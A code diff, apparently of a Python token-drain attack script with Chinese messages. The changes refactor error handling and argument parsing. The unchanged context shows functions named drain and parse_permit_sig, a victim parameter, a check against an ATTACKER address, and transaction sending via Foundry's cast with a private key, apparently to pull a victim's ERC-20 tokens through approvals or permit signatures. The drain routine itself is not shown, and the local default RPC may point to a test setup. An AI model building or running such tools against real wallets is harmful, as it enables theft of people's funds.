@@ -82,14 +82,14 @@ def parse_permit_sig(sig: str):
 def send(url: str, to: str, data: str, key: str) -> str:
     cast = shutil.which("cast") or str(pathlib.Path.home() / ".foundry" / "bin" / "cast")
     if not pathlib.Path(cast).exists():
-        raise SystemExit("[!] 需要 cast(Foundry),未找到;安装见 https://book.getfoundry.sh")
+        raise RuntimeError("[!] 需要 cast(Foundry),未找到;安装见 https://book.getfoundry.sh")
     proc = subprocess.run(
         [cast, "send", to, "--rpc-url", url, "--private-key", key,
          "--data", "0x" + data.removeprefix("0x"), "--json"],
         capture_output=True, text=True, timeout=60,
     )
     if proc.returncode != 0:
-        raise SystemExit(f"[!] 交易发送失败:\n{proc.stdout}{proc.stderr}")
+        raise RuntimeError(f"[!] 交易发送失败:\n{proc.stdout}{proc.stderr}")
     receipt = None
     for line in reversed(proc.stdout.splitlines()):
         line = line.strip()
@@ -97,9 +97,9 @@ def send(url: str, to: str, data: str, key: str) -> str:
             receipt = json.loads(line)
             break
     if not receipt:
-        raise SystemExit(f"[!] 无法解析 cast 回执:\n{proc.stdout[-400:]}")
+        raise RuntimeError(f"[!] 无法解析 cast 回执:\n{proc.stdout[-400:]}")
     if receipt.get("status") != "0x1":
-        raise SystemExit(f"[!] 交易在链上 revert(未生效),回执: {receipt.get('transactionHash')}")
+        raise RuntimeError(f"[!] 交易在链上 revert(未生效),回执: {receipt.get('transactionHash')}")
     return receipt["transactionHash"]
 
 
@@ -118,6 +118,13 @@ def drain(url: str, token: str, victim: str, amount: int, key: str,
 
 
 def main() -> int:
+    try:
+        return _run(ap_parse())
+    except RuntimeError as exc:
+        raise SystemExit(str(exc))
+
+
+def ap_parse():
     ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
     ap.add_argument("--rpc", default="http://127.0.0.1:8546")
     ap.add_argument("--token", required=True, help="代币合约地址")
@@ -131,7 +138,10 @@ def main() -> int:
     ap.add_argument("--deadline", type=lambda x: int(x, 0), default=1893456000)
     ap.add_argument("--nonce", type=lambda x: int(x, 0), default=0)
     args = ap.parse_args()
+    return args
 
+
+def _run(args) -> int:
     if args.tx:
         victim, spender, amount = parse_approve_tx(args.rpc, args.tx)
         if spender.lower() != ATTACKER.lower():
